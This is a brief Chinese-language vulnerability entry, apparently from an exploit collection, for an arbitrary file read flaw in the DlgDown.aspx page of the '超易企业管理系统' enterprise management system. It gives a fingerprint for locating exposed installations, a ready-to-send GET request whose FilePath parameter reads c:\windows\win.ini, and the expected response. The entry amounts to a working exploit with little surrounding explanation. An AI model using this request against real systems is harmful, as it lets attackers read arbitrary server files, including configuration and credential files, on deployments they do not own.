# 超易企业管理系统DlgDown.aspx存在任意文件读取漏洞

超易企业管理系统 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="超易企业管理系统"`
- **请求**：`GET /DlgDown.aspx?FileName=1.txt&FilePath=c:\windows\win.ini HTTP/1.1`
- **响应特征**：200 [Mail]